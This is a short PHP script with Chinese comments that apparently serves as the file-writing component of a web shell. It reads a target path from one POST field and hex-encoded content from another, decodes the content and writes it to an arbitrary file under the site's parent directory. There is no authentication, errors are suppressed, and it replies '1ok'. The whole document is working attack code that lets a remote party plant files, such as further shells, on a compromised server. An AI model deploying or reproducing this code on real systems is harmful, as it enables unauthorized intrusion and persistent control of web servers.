<?php 
$f=realpath(dirname(__FILE__)."/../").$_POST["z1"]; //返回生成文件的路径
$c=$_POST["z2"];$buf=""; //z2获取内容到变量c中,初始化变量buf
for($i=0;$i<strlen($c);$i+=2)$buf.=urldecode("%".substr($c,$i,2)); //计次循环,解码c提交上来的内容
@fwrite(fopen($f,"w"),$buf); echo "1ok"; //生成文件
?>